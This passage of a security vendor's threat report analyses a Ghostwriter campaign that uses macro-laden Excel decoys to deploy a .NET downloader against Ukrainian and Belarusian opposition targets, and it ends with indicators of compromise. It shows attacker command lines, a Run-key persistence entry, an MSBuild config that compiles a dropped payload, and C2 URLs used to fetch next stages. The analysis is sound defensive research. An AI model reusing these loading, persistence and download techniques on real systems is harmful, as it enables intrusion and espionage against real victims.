<figure id="attachment_114850" aria-describedby="caption-attachment-114850" style="width: 1837px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_3.jpg" alt="Obfuscated macro inside the XLS spreadsheet" width="1837" height="752" class="size-full wp-image-114850" srcset="https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_3.jpg 1837w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_3-300x123.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_3-1024x419.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_3-768x314.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_3-1536x629.jpg 1536w" sizes="auto, (max-width: 1837px) 100vw, 1837px" /><figcaption id="caption-attachment-114850" class="wp-caption-text">Obfuscated macro inside the XLS spreadsheet</figcaption></figure>
<p>On execution, the macro writes a file to <code>%Temp%\Realtek(r)Audio.dll</code>.</p>
<p>The DLL file is loaded with the following command line invocation:</p>
<pre>
C:\Windows\System32\regsvr32.exe /u /s "C:\Temp\Realtek(r)Audio.dll”
</pre>
<p>This starts the standard Windows process <code>regsvr32.exe</code>, which calls the <code>DllUnregisterServer</code> function implemented inside the DLL; the function then loads and executes the .NET assembly described next.</p>
<p>Analysis of <code>Dwnldr.dll</code> shows that it is a DLL file with a .NET assembly embedded inside. The file is protected with <a href="https://mkaring.github.io/ConfuserEx/" target="_blank" rel="noopener noreferrer">ConfuserEx</a> &#8211; a publicly available tool that helps to obfuscate .NET programs and observed in previous Ghostwriter campaigns.</p>
<p>The DLL file hosts a payload that appears to be a simplified variant of PicassoDownloader, a malware family also linked to Ghostwriter activity. The internal filename (<code>Dwnldr.dll</code>) was previously used by the Ghostwriter threat actor; however, this variant bears only high-level similarities to previous versions, with significant changes to the underlying code, possibly to make it a cheaper and more expendable tool.</p>
<p>As a part of application protection provided by the obfuscator, the Downloader creates a copy of itself in memory, and then modifies it. It does so by decrypting additional code of the assembly. It also uses a clever evasion technique, altering its own PE header in memory and breaking internal links to the .NET assembly. This makes it impossible for security products to parse it as a .NET module.</p>
<p>During code execution, after the protection layer passes control to core functionality, the Downloader writes a decoy Excel workbook file to <code>%AppData%\Roaming\Microsoft\temp.xlsx</code> and downloads additional file(s) from the Web.</p>
<p>The <code>temp.xlsx</code> decoy file (<code>18151b3801bd716b5a33cfc85dbdc4ba84a00314</code>) is immediately opened in Excel in an attempt to make the victim believe that it contains the original content of the <code>политзаключенные (по судам минска).xls</code> file.</p>
<figure id="attachment_114854" aria-describedby="caption-attachment-114854" style="width: 1999px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_11.jpg" alt="Decoy document containing lists of people with criminal charges, prosecutors’ and judges’ names" width="1999" height="803" class="size-full wp-image-114854" srcset="https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_11.jpg 1999w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_11-300x121.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_11-1024x411.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_11-768x309.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_11-1536x617.jpg 1536w" sizes="auto, (max-width: 1999px) 100vw, 1999px" /><figcaption id="caption-attachment-114854" class="wp-caption-text">Decoy document containing lists of people with criminal charges, prosecutors’ and judges’ names</figcaption></figure>
<p>The spreadsheet contains the names of people with criminal charges along with the names of prosecutors and judges: content that invites the reader to believe it could be leaked from a government source. However, the information was already in the public domain and can be found on the website of a proscribed Belarusian human rights organization, <a href="https://prisoners.spring96.org/ru/list" target="_blank" rel="noopener noreferrer">Spring96</a>.</p>
<p>Once the decoy Excel file is opened, the Downloader attempts to fetch the next stage from the following URL:</p>
<pre>
https://everythingandthedog[.]shop/petsblog/2020/2/25/tips-for-taking-difficult-dogs-on-a-walk.jpg
</pre>
<figure id="attachment_114852" aria-describedby="caption-attachment-114852" style="width: 720px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_13.jpg" alt="The JPG image file fetched from the C2" width="720" height="960" class="size-full wp-image-114852" srcset="https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_13.jpg 720w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_13-225x300.jpg 225w" sizes="auto, (max-width: 720px) 100vw, 720px" /><figcaption id="caption-attachment-114852" class="wp-caption-text">The JPG image file fetched from the C2</figcaption></figure>
<p>We note that the <code>.shop</code> top level domain was also reported in other Ghostwriter activity seen in 2024.</p>
<p>When the malware issues the HTTP request, it uses a hardcoded User-Agent string:</p>
<pre>
Mozilla/5.0 (<b>Macintosh; Intel Mac OS X 10_15_7</b>) AppleWebKit/555.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
</pre>
<p>The fetched file (<code>8d2bb96e69df059f279d97989690ce3e556a8318</code>) is a benign JPEG file, originating from publicly available photo stock, with no extra payload or any hidden cave where code could be embedded. We confirmed that an identical file can be found online, located on a web site that is nearly identical to the one used by attackers. It would seem the attackers not only reused the JPG file contents from a legitimate website but also copied its original URL, changing only the top level domain:</p>
<pre>
https://www.everythingandthedog<b>.com</b>/petsblog/2020/2/25/tips-for-taking-difficult-dogs-on-a-walk.
</pre>
<p>Once the file is downloaded, it is renamed and then saved to <code>%APPDATA%\Roaming\Microsoft\SystemCertificates\CertificateCenter.dll</code>.</p>
<p>Later, it is registered to load during autostart by leveraging the Registry Run key:</p>
<pre>
HKCU\System\Software\Microsoft\Windows\CurrentVersion\Run\Microsoft Certificate Center
</pre>
<p>with its value pointing to expanded environment variable string:</p>
<pre>
rundll32.exe C:\Users\<Username>\AppData\Roaming\Microsoft\SystemCertificates\CertificateCenter.dll,#1
</pre>
<p>This Registry entry makes <code>rundll32.exe</code> load the DLL and execute its exported function with ordinal 1 whenever a user logs on.</p>
<figure id="attachment_114847" aria-describedby="caption-attachment-114847" style="width: 1999px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_6.jpg" alt="Overview of the malware stages for Weaponized XLS 1" width="1999" height="1180" class="size-full wp-image-114847" srcset="https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_6.jpg 1999w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_6-300x177.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_6-1024x604.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_6-768x453.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_6-1536x907.jpg 1536w" sizes="auto, (max-width: 1999px) 100vw, 1999px" /><figcaption id="caption-attachment-114847" class="wp-caption-text">Overview of the malware stages for Weaponized XLS 1</figcaption></figure>
<p>During our analysis we only observed the benign JPG file being downloaded. However, based on the code analysis, we believe that the real targets receive an actual DLL. We assume that such a targeted payload delivery process is carefully controlled by the attackers and that they deliver the payload only after confirming the requesting client&#8217;s profile (browser user agent, IP address of the client, and matching time of the operation window). <a href="https://www.fortinet.com/blog/threat-research/menace-unleashed-excel-file-deploys-cobalt-strike-at-ukraine" target="_blank" rel="noopener noreferrer">Research</a> in a previous campaign found that a Cobalt Strike payload was delivered to targets only if the host IP was located in Ukraine.</p>
<p>Given the timing and targeting of the attack, we hypothesized that it may not have been an isolated incident. Further research led us to discover other samples closely resembling Weaponized XLS 1, suggesting that multiple attacks using the same techniques had been planned or executed. The samples used in these suspected attacks are described below.</p>
<h2>Weaponized XLS 2 | Ukraine Gov “Anti-Corruption Initiative”</h2>
<p>A file bearing the Ukrainian name <code>Zrazok.xls</code> (“Sample.xls”) is an XLS file (<code>301ffdf0c7b67e01fd2119c321e7ae09b7835afc</code>) with an obfuscated VBA macro embedded. However, the script code and obfuscation technique are different from the case we discussed earlier.</p>
<p>For this script, the attackers used a popular obfuscator tool called <a href="https://github.com/sevagas/macro_pack" target="_blank" rel="noopener noreferrer">Macropack</a>, an open-source but seemingly abandoned project originally developed for red-teaming and penetration testing exercises.</p>
<figure id="attachment_114845" aria-describedby="caption-attachment-114845" style="width: 1837px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_8.jpg" alt="Macropack-obfuscated VBA macro found inside the spreadsheet" width="1837" height="752" class="size-full wp-image-114845" srcset="https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_8.jpg 1837w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_8-300x123.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_8-1024x419.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_8-768x314.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_8-1536x629.jpg 1536w" sizes="auto, (max-width: 1837px) 100vw, 1837px" /><figcaption id="caption-attachment-114845" class="wp-caption-text">Macropack-obfuscated VBA macro found inside the spreadsheet</figcaption></figure>
<p>As in the previous case, once the macro code is executed, the .NET ConfuserEx-obfuscated Downloader DLL (written to <code>%AppData%\Roaming\Microsoft\bruhdll32.dll</code>) is loaded with <code>rundll32.exe</code> and respective commandline arguments to run an exported function. After this, the new module drops a decoy XLS file and opens it with Excel.</p>
<figure id="attachment_114851" aria-describedby="caption-attachment-114851" style="width: 1790px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_2.jpg" alt="The decoy document prepared for a Ukrainian reader (an action plan for anti-corruption initiative in government organisations in Ukraine)" width="1790" height="1255" class="size-full wp-image-114851" srcset="https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_2.jpg 1790w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_2-300x210.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_2-1024x718.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_2-768x538.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_2-1536x1077.jpg 1536w" sizes="auto, (max-width: 1790px) 100vw, 1790px" /><figcaption id="caption-attachment-114851" class="wp-caption-text">The decoy document prepared for a Ukrainian reader (an action plan for anti-corruption initiative in government organisations in Ukraine)</figcaption></figure>
<p>This module attempts to download the next stage from the following URL (unavailable at the time of writing):</p>
<pre>
https://sciencealert[.]shop/images/2024/11/black-hole-coronaxx.jpg
</pre>
<p>When the malware issues the HTTP request it uses a hardcoded User-Agent string that differs slightly from the previous case:</p>
<pre>
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
</pre>
<p>Notably, this file (<code>52e894acf0e14d27f8997d2174c1f40d6d87bba9</code>) was previously uploaded to <a href="https://www.virustotal.com/gui/file/4497bb70ca95b115d7be403141e34f7fb06070b8dd6ccf034d9a71c1c48826e4/details" target="_blank" rel="noopener noreferrer">VirusTotal</a> on December 19, 2024.</p>
<figure id="attachment_114846" aria-describedby="caption-attachment-114846" style="width: 1024px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_7.jpg" alt="Image file fetched from the malicious URL" width="1024" height="415" class="size-full wp-image-114846" srcset="https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_7.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_7-300x122.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_7-768x311.jpg 768w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /><figcaption id="caption-attachment-114846" class="wp-caption-text">Image file fetched from the malicious URL</figcaption></figure>
<p>As with the previous case, the image file and its URL path appear to be copied from a public blog, published on Nov 16, 2024:</p>
<pre>
https://www.sciencealert.com/scientists-reveal-the-shape-of-a-black-holes-corona-for-the-very-first-time
</pre>
<p>Again, the file name and the path on the malicious server were nearly identical to the legitimate one, with the actor changing only the top level domain from <code>.com</code> to <code>.shop</code>.</p>
<pre>
https://www.sciencealert.com/images/2024/11/black-hole-coronaxx.jpg
</pre>
<p>In this case, the downloaded file is expected to be an archive in a GZIP format. Once downloaded, the malware decompresses it and saves it to the following location:</p>
<pre>
%APPDATA%\Roaming\Microsoft\SystemCertificates\CertificateCenter.dll
</pre>
<p>It also creates an additional text config file at:</p>
<pre>
%APPDATA%\Roaming\Microsoft\SystemCertificates\config
</pre>
<p>The config file contains the following data:</p>
<pre>
&lt;Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003"&gt;
 &lt;PropertyGroup&gt;
  &lt;AssemblyName&gt;Certificate&lt;/AssemblyName&gt;
  &lt;OutputPath&gt;Bin\&lt;/OutputPath&gt;
 &lt;/PropertyGroup&gt;
 &lt;ItemGroup&gt;
  &lt;Compile Include="CertificateCenter.dll" /&gt;
 &lt;/ItemGroup&gt;
 &lt;Target Name="Build"&gt;
  &lt;MakeDir Directories="$(OutputPath)" Condition="!Exists('$(OutputPath)')" /&gt;
  &lt;Csc Sources="@(Compile)" OutputAssembly="$(OutputPath)$(AssemblyName).exe" /&gt;
 &lt;/Target&gt;
&lt;/Project&gt;
</pre>
<p>The config file is used by the Downloader to execute <code>MSBuild.exe</code>, instructing it to build a new application:</p>
<pre>
C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe %AppData%\Roaming\Microsoft\SystemCertificates\config
</pre>
<p>This suggests that the <code>CertificateCenter.dll</code> file is not a binary as the file extension would suggest but rather contains program source code. The command, if successful, produces an executable file in the following location:</p>
<pre>
%AppData%\Roaming\Microsoft\SystemCertificates\Bin\Certificate.exe
</pre>
<p>and likely contains the next stage of the infection chain.</p>
<figure id="attachment_114848" aria-describedby="caption-attachment-114848" style="width: 1999px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_5.jpg" alt="Overview of the malware stages for Weaponized XLS 2" width="1999" height="1621" class="size-full wp-image-114848" srcset="https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_5.jpg 1999w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_5-300x243.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_5-1024x830.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_5-768x623.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_5-1536x1246.jpg 1536w" sizes="auto, (max-width: 1999px) 100vw, 1999px" /><figcaption id="caption-attachment-114848" class="wp-caption-text">Overview of the malware stages for Weaponized XLS 2</figcaption></figure>
<h2>Weaponized XLS 3 | &#8220;Supplies for Ukraine Armed Forces&#8221;</h2>
<p>A file bearing the Ukrainian name <code>Донесення 5 реч - зразок.xls</code> (“Report 5 items &#8211; sample.xls”) is an XLS file (<code>9d110879d101bcaec7accc3001295a53dc33371f</code>) hosting another VBA payload obfuscated with Macropack.</p>
<p>As in the previous cases, once the macro code is executed, the .NET ConfuserEx-obfuscated Downloader DLL (written to <code>%AppData%\Roaming\Microsoft\bruhdll32.dll</code>) is loaded with <code>rundll32.exe</code> and respective commandline arguments to run an exported function. After this, the new module drops a decoy XLS file on disk and opens it with Excel.</p>
<figure id="attachment_114849" aria-describedby="caption-attachment-114849" style="width: 1989px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_4.jpg" alt="The decoy document prepared for a Ukrainian reader (a report template for the Ukrainian armed forces supplies)" width="1989" height="1256" class="size-full wp-image-114849" srcset="https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_4.jpg 1989w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_4-300x189.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_4-1024x647.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_4-768x485.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_4-1536x970.jpg 1536w" sizes="auto, (max-width: 1989px) 100vw, 1989px" /><figcaption id="caption-attachment-114849" class="wp-caption-text">The decoy document prepared for a Ukrainian reader (a report template for the Ukrainian armed forces supplies)</figcaption></figure>
<p>Again, the malware uses the same payload retrieval technique and downloads a JPG file from yet another <code>.shop</code> domain:</p>
<pre>
https://cookingwithbooks[.]shop/images/qwerty.jpg
</pre>
<p>The URL is unavailable at the time of writing, but data from VirusTotal indicates that the downloaded file is identical to the black hole image described above in the Weaponized XLS 2 section. The malware logic is also identical with Weaponized XLS 2.</p>
<h2>Weaponized XLS 4 &amp; 5 | Variations on a Theme</h2>
<p>In addition to the previous findings, we discovered further related XLS files that were similarly weaponized. The files <code>Донесення 5 реч фонд зборів- зразок.xls</code> (“Report 5 items collection fund- sample.xls”; <code>2c06c01f9261fe80b627695a0ed746aa8f1f3744</code>) and <code>Додаток 8 реч новий.xls</code> (“Addition 8 items new &#8211; sample.xls”; <code>853da593d2a489c2bd72a284a362d7c68c3a4d4c</code>) were first uploaded from Ukraine in Feb 2025.</p>
<p>Both files contain a Macropack-obfuscated VBA macro; however, they differ in structure. Functionally, both drop a DLL to the previously noted path <code>%AppData%\Roaming\Microsoft\bruhdll32.dll</code>.</p>
<p>Again, the DLL is loaded with <code>rundll32.exe</code> and respective command line arguments to execute an exported function. Next, the victim sees a decoy workbook open in Excel.</p>
<p><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_12.jpg" alt="" width="1816" height="1138" class="aligncenter size-full wp-image-114853" srcset="https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_12.jpg 1816w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_12-300x188.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_12-1024x642.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_12-768x481.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_12-1536x963.jpg 1536w" sizes="auto, (max-width: 1816px) 100vw, 1816px" /><br />
<figure id="attachment_114855" aria-describedby="caption-attachment-114855" style="width: 1868px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_10.jpg" alt="The decoy documents prepared for a Ukrainian reader (a report template for the Ukrainian armed forces supplies)" width="1868" height="1142" class="size-full wp-image-114855" srcset="https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_10.jpg 1868w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_10-300x183.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_10-1024x626.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_10-768x470.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_10-1536x939.jpg 1536w" sizes="auto, (max-width: 1868px) 100vw, 1868px" /><figcaption id="caption-attachment-114855" class="wp-caption-text">The decoy documents prepared for a Ukrainian reader (a report template for the Ukrainian armed forces supplies)</figcaption></figure></p>
<p>The decoys are similar and the obfuscation technique, code structure, and the embedded URL are common to both:</p>
<pre>
https://pigglywigglystores[.]shop/wp-content/themes/fp-wp-j-piggly-wiggly-nc/resources/images/logo/logo.png
</pre>
<p>The User-Agent string in the HTTP request, however, is different, with the operating system and architectures specified as “Windows NT 10.0; Win64; x64”.</p>
<pre>
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 Edg/97.0.1072.71
</pre>
<p>These variants of the malware also contain another embedded .NET DLL, internally referred to as LibCMD from the original filename <code>LibCMD.dll</code> (<code>4ae6b8adc980ba8a212b838f3ca6a9718d9a3757</code>). This is a small file, whose purpose is simply to start <code>cmd.exe</code> and connect to stdin/stdout.</p>
<p>The file contains a tampered PE link timestamp. It is never saved to disk; instead, it is loaded dynamically in memory as a .NET assembly and executed.</p>
<figure id="attachment_114844" aria-describedby="caption-attachment-114844" style="width: 1999px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_9.jpg" alt="Overview of the malware stages for Weaponized XLS 4 &amp; 5" width="1999" height="1621" class="size-full wp-image-114844" srcset="https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_9.jpg 1999w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_9-300x243.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_9-1024x830.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_9-768x623.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_9-1536x1246.jpg 1536w" sizes="auto, (max-width: 1999px) 100vw, 1999px" /><figcaption id="caption-attachment-114844" class="wp-caption-text">Overview of the malware stages for Weaponized XLS 4 &amp; 5</figcaption></figure>
<h2>Attribution</h2>
<p>Analysis of techniques used by threat actors can often be helpful in establishing the origin of the attack and the malware it uses. In this case, the obfuscation techniques are quite specific across all the samples we analyzed, allowing us to establish a medium confidence link between them and a malware cluster known as PicassoLoader, a downloader toolkit.</p>
<p>PicassoLoader has been used in cyber attacks targeting government, military, and civilian entities in Ukraine and Poland and is exclusively associated with the Ghostwriter threat actor (<i>aka</i> UNC1151, UAC-0057, Blue Dev 4, Moonscape, TA445).</p>
<p>Throughout 2024, Ghostwriter has repeatedly used a combination of Excel workbooks containing Macropack-obfuscated VBA macros and dropped embedded .NET downloaders obfuscated with ConfuserEx. In our case, the Downloader malware appears to be a simplified implementation of the PicassoLoader.</p>
<h2>Conclusion</h2>
<p>The Ghostwriter threat actor has been consistently active in the past years and continues its attempts to compromise targets aligned with the interests of Belarus and its closest ally, Russia. It has mounted multiple attacks reported by CERT UA and other security researchers throughout 2024.</p>
<p>While Belarus doesn’t actively participate in military campaigns in the war in Ukraine, cyber threat actors associated with it appear to have no reservation about conducting cyberespionage operations against Ukrainian targets.</p>
<p>The campaign described in this publication also serves as confirmation that Ghostwriter is closely tied with the interests of the Belarusian government waging an aggressive pursuit of its opposition and organizations associated with it.</p>
<div id="threattips"></div>
<p>We would like to express our thanks to partners in the region, including <a href="https://resident.ngo/" target="_blank" rel="noopener noreferrer">RESIDENT.NGO</a> and others who remain unnamed, for their invaluable collaboration. </p>
<p>Organizations that believe they may have been targeted by threat actors involved in this campaign are invited to reach out to the SentinelLABS team via <a href="mailto:ThreatTips@sentinelone.com" target="_blank" rel="noopener noreferrer">ThreatTips@sentinelone.com</a>.</p>
<h2>Indicators of Compromise</h2>
<div style="font-size:0.9em">
<b>Weaponized Excel Workbooks and Decoys</b></p>
<div style="overflow-x:auto;">
<table style="border-collapse: collapse; width: 100%; height: 120px;">
<tbody>
<tr style="height: 24px;">
<td style="width: 65.0%; height: 24px;"><strong>SHA-1</strong></td>
<td style="width: 35.0%; height: 24px;"><strong>File Name</strong></td>
</tr>
<tr style="height: 24px;">
<td style="width: 65.0%; height: 24px;">18151b3801bd716b5a33cfc85dbdc4ba84a00314</td>
<td style="width: 35.0%; height: 24px;">temp.xlsx</td>
</tr>
<tr style="height: 24px;">
<td style="width: 65.0%; height: 24px;">2c06c01f9261fe80b627695a0ed746aa8f1f3744</td>
<td style="width: 35.0%; height: 24px;">Донесення 5 реч фонд зборів- зразок.xls</td>
</tr>
<tr style="height: 24px;">
<td style="width: 65.0%; height: 24px;">301ffdf0c7b67e01fd2119c321e7ae09b7835afc</td>
<td style="width: 35.0%; height: 24px;">Zrazok.xls</td>
</tr>
<tr style="height: 24px;">
<td style="width: 65.0%; height: 24px;">853da593d2a489c2bd72a284a362d7c68c3a4d4c</td>
<td style="width: 35.0%; height: 24px;">Додаток 8 реч новий.xls</td>
</tr>
<tr style="height: 24px;">
<td style="width: 65.0%; height: 24px;">9d110879d101bcaec7accc3001295a53dc33371f</td>
<td style="width: 35.0%; height: 24px;">Донесення 5 реч &#8211; зразок.xls</td>
</tr>
<tr style="height: 24px;">
<td style="width: 65.0%; height: 24px;">ebb30fd99c2e6cbae392c337df5876759e53730d</td>
<td style="width: 35.0%; height: 24px;">политзаключенные (по судам минска).xls</td>
</tr>
</tbody>
</table>
</div>
<p><b>Downloaders</b><br />
18bcc91ad3eed529d44926f4ae65acf44480f39d<br />
64fca582cb69d9dc2afb1b432df58fb32ac18ca1<br />
7261ad5d4e760aa88df94b734bc44598a090852a<br />
9fa00a4ee4e95bc50a3919d2d3c0be2a567d8845<br />
e5ebc7deca1ff1f0a4b1462d37ef813dad8413a6</p>
<p><b>LibCMD helper file</b><br />
4ae6b8adc980ba8a212b838f3ca6a9718d9a3757</p>
<p><b>C2 Domains</b><br />
americandeliriumsociety[.]shop<br />
cookingwithbooks[.]shop<br />
everythingandthedog[.]shop<br />
pigglywigglystores[.]shop<br />
sciencealert[.]shop
</div>
]]></content:encoded>
					
		
		
		<enclosure url="https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter-ftr.jpg" length="411675" type="image/jpeg" />	</item>
	</channel>
</rss>
